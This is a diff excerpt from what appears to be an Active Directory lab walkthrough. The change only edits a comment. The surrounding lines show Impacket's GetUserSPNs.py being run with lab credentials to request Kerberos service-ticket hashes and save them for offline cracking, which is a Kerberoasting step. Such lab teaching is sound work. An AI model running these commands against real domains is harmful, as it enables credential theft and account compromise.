@@ -62,7 +62,7 @@ python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.5
 # Now with the -request flag
 python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2 -request
 
-# Step 3: Save the extracted hashes, each in their own txt file. cd to a location where you can create files. For us we saved them in Documents.
+# Step 3: Save the extracted hashes, each in their own txt file. cd to a location where you can create files. We saved them in Documents.
 
 # extract the easy hash  (corresponding to account with weak password) to a txt file
 echo 'manually copy eash hash value here' > easy_hash.txt
